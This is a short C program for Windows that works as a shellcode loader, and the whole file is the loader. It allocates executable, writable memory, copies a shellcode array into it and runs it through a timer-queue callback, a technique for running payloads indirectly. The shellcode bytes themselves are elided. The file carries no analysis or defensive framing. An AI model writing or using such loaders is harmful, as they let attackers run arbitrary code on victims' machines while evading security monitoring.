#include <windows.h>
#include <stdio.h>
#include <wct.h>
#include <stdint.h>
#define LEN 277


unsigned char shellcode[] = ...

int main(){
	LPVOID addr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	RtlMoveMemory(addr, shellcode, sizeof(shellcode));

	HANDLE timer;
	HANDLE queue = CreateTimerQueue();
	HANDLE gDoneEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	if (CreateTimerQueueTimer(&timer, queue, (WAITORTIMERCALLBACK)addr, NULL, 100, 0, 0)) {
		WaitForSingleObject(gDoneEvent, INFINITE);
	}
}